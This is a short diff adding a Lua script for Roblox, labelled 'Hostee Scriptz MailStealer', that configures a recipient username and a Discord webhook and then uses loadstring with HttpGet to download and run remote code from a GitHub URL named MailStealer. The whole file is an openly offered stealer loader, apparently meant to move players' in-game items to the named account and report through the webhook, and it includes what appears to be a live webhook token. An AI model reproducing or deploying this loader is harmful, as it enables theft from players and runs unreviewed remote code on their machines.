@@ -1,0 +1,10 @@
+--[[ Hostee Scriptz MailStealer ]]--
+
+--[[ Main Config ]]--
+_G.UserNamey = "ChinaNumberJS"
+
+--[[ Webhook Config ]]--
+_G.Webhooky = "https://discord.com/api/webhooks/1119024560591884409/RZm1bNlVL8TKJJImeGLLdSeAqLQ8a3Lgw-jM7x2kAflPioQT56AhLXq9NkaXNuCiocmi"
+
+--[[ Main Script ]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20MailStealer%20%E2%9C%97"))()
